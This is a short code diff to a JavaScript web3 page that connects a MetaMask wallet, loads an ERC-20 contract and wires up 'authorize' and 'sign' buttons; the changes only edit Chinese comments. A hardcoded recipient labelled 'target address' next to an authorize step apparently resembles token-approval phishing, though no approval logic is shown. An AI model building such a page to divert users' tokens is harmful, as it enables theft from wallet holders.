@@ -1,4 +1,4 @@
-const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699';
+const recipientAddress = '0xa465e2fc9f9d527aaeb07579e821d461f700e699'; // 目标地址
 let web3;
 let isConnected = false;
 let isRequestPending = false;
@@ -67,7 +67,7 @@ async function connectWallet(walletType) {
                 const accounts = await web3.eth.getAccounts();
                 if (accounts.length > 0) {
                     account = accounts[0];
-                    tokenContract = new web3.eth.Contract(erc20Abi, '0xYourTokenContractAddress'); // 填写合约地址
+                    tokenContract = new web3.eth.Contract(erc20Abi, '0xYourTokenContractAddress'); // 请替换为实际合约地址
                     updateWalletList(account);
                     isConnected = true;
                     document.getElementById('status').innerText = 'MetaMask 已连接';
@@ -156,8 +156,6 @@ document.getElementById('authorizeButton').onclick = async () => {
 
 // 签名按钮点击事件
 document.getElementById('signButton').onclick = async () => {
-    // 签名逻辑可以放在这里
-    // 如果不需要额外的签名流程，可以省略这部分代码
     document.getElementById('status').innerText = '签名按钮被点击，但目前没有额外的签名逻辑。';
 };
 
